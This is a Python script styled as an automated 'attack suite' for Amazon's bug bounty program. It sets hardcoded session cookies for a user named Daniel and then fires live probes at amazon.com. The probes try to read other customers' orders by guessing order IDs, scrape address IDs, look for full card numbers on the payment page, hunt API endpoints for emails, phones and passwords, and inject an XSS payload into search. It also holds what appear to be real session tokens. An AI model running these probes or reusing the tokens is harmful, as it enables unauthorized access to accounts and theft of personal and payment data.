"""
ALFRED Automated Attack Suite - Amazon VRP
Full vulnerability scan with fresh session
"""
import requests
import time
import re
from datetime import datetime
from urllib.parse import quote

print('='*60)
print('ALFRED AUTOMATED ATTACK SUITE')
print('Amazon VRP - Full Vulnerability Scan')
print('='*60)
print(f'Time: {datetime.now().isoformat()}')
print('='*60)

# Setup session with fresh cookies
session = requests.Session()
cookies = {
    'session-id': '137-5920558-2461442',
    'ubid-main': '134-4405918-4002641',
    'session-token': '7FWiwL5xCWj07LN3B26d49vgq1U+Gm0vOx0knf0CsgYairMicWn62YUqSIfFaH6J3mEXmrAdrArSZuoFjKlcBtb4g8LTd3Eyecr+Gl5fu8X3510P4S/se1EETZEPL3eaZxS/f6hdVEPEZQ2MrzMaWuzjaHj2kj9IwgLIsoXgzSQwGNm28bRo2I5RvPaMF+h+hKMPYOR2MviWdkKId2sBUsKINbsSSaQEXDILdIjLPriIIzdzV50ynXTmkuGAMPMLV3A9H0qJF9glCUmewin5jnUdy33AoiFo76u+sm5LAw7oVbmeT8Nhmiqj6eI3ceq3JSRppHmc9B1tBKF20E50v979OUo59rcenfamZLr42YeQysL0F7bPUZ78pHGhRsUI',
    'x-main': 'ezkDeYLzpQKMDOjb6RiGNcYteThx9l2@uymJxzS34a1j6qFgTx4TKPRn92rPsIv1',
    'i18n-prefs': 'USD',
    'lc-main': 'en_US'
}

for name, value in cookies.items():
    session.cookies.set(name, value, domain='.amazon.com')

session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
})

RATE = 0.3
findings = []

# Verify auth
print('\n[AUTH] Verifying session...')
r = session.get('https://www.amazon.com')
if 'Hello, Daniel' in r.text:
    print('  [+] Logged in as Daniel!')
else:
    print('  [-] Auth check - continuing anyway')

# Test 1: Get order IDs
print('\n[1/8] EXTRACTING ORDER IDs...')
time.sleep(RATE)
r = session.get('https://www.amazon.com/gp/your-account/order-history')
order_ids = list(set(re.findall(r'([0-9]{3}-[0-9]{7}-[0-9]{7})', r.text)))
print(f'  Found {len(order_ids)} orders')

# Test 2: IDOR on orders
print('\n[2/8] TESTING ORDER IDOR...')
if order_ids:
    own_order = order_ids[0]
    print(f'  Own order: {own_order}')

    # Try accessing with modified IDs
    test_ids = [
        '999-9999999-9999999',
        '111-1111111-1111111',
    ]

    for test_id in test_ids:
        time.sleep(RATE)
        r = session.get(f'https://www.amazon.com/gp/your-account/order-details?orderID={test_id}')
        if r.status_code == 200 and 'order' in r.text.lower():
            if 'not found' not in r.text.lower() and 'error' not in r.text.lower():
                print(f'  [!] POTENTIAL IDOR: {test_id}')
                findings.append({'type': 'IDOR', 'severity': 'HIGH', 'location': f'Order {test_id}'})
            else:
                print(f'  [OK] {test_id} - Rejected')
        else:
            print(f'  [OK] {test_id} - No access')
else:
    print('  No orders to test')

# Test 3: Address book IDOR
print('\n[3/8] TESTING ADDRESS IDOR...')
time.sleep(RATE)
r = session.get('https://www.amazon.com/a/addresses')
address_ids = re.findall(r'addressId[=:"]+([A-Za-z0-9\-]+)', r.text)
if address_ids:
    print(f'  Found {len(set(address_ids))} address IDs')
else:
    print('  No address IDs found')

# Test 4: Payment methods
print('\n[4/8] CHECKING PAYMENT SECURITY...')
time.sleep(RATE)
r = session.get('https://www.amazon.com/cpe/yourpayments/wallet')
if 'ending in' in r.text.lower():
    print('  [+] Payment page accessible')
    # Check if full card numbers exposed
    full_cards = re.findall(r'[0-9]{13,16}', r.text)
    if full_cards:
        print('  [!] CRITICAL: Full card numbers exposed!')
        findings.append({'type': 'Info Disclosure', 'severity': 'CRITICAL', 'location': 'Payment - full card'})
    else:
        print('  [OK] Card numbers masked')
else:
    print('  [-] Payment page not accessible')

# Test 5: Gift card balance
print('\n[5/8] TESTING GIFT CARD ENDPOINTS...')
time.sleep(RATE)
r = session.get('https://www.amazon.com/gc/balance')
if r.status_code == 200:
    print('  [+] Gift card page accessible')

# Test 6: Hidden API endpoints
print('\n[6/8] PROBING API ENDPOINTS...')
api_tests = [
    '/api/marketplaces',
    '/gp/gfix/v2/customer',
    '/gp/aw/si.html',
    '/hz/wishlist/api',
    '/gp/customer-reviews/api',
]
for endpoint in api_tests:
    time.sleep(RATE)
    try:
        r = session.get(f'https://www.amazon.com{endpoint}')
        ct = r.headers.get('Content-Type', '')
        if r.status_code == 200 and 'json' in ct:
            print(f'  [+] {endpoint} - JSON response!')
            if any(x in r.text.lower() for x in ['email', 'phone', 'ssn', 'password']):
                print(f'      [!] Sensitive data in response!')
                findings.append({'type': 'Info Disclosure', 'severity': 'MEDIUM', 'location': endpoint})
        elif r.status_code == 200:
            print(f'  [+] {endpoint} - {r.status_code}')
        else:
            print(f'  [-] {endpoint} - {r.status_code}')
    except Exception as e:
        print(f'  [-] {endpoint} - Error')

# Test 7: Cart access
print('\n[7/8] TESTING CART ACCESS...')
time.sleep(RATE)
r = session.get('https://www.amazon.com/gp/cart/view.html')
if r.status_code == 200:
    print('  [+] Cart accessible')
    # Check for CSRF
    if 'anti-csrf' in r.text.lower() or 'token' in r.text.lower():
        print('  [OK] CSRF protection present')
    else:
        print('  [?] CSRF token not found - investigate')

# Test 8: XSS in search
print('\n[8/8] TESTING XSS VECTORS...')
xss_payload = '<script>alert(1)</script>'
time.sleep(RATE)
r = session.get(f'https://www.amazon.com/s?k={quote(xss_payload)}')
if xss_payload in r.text:
    print('  [!] XSS payload reflected!')
    findings.append({'type': 'XSS', 'severity': 'HIGH', 'location': 'Search'})
else:
    print('  [OK] XSS payload sanitized')

# Summary
print('\n' + '='*60)
print('SCAN COMPLETE')
print('='*60)
print(f'Total Findings: {len(findings)}')
print()

if findings:
    print('VULNERABILITIES FOUND:')
    for f in findings:
        print(f"  [{f['severity']}] {f['type']} @ {f['location']}")
else:
    print('No critical vulnerabilities found.')
    print('Amazon has strong security controls.')

print()
print('NEXT STEPS:')
print('- Manual race condition testing (Burp Turbo Intruder)')
print('- GraphQL endpoint discovery')
print('- Mobile app API testing')
print('- Business logic testing on checkout')
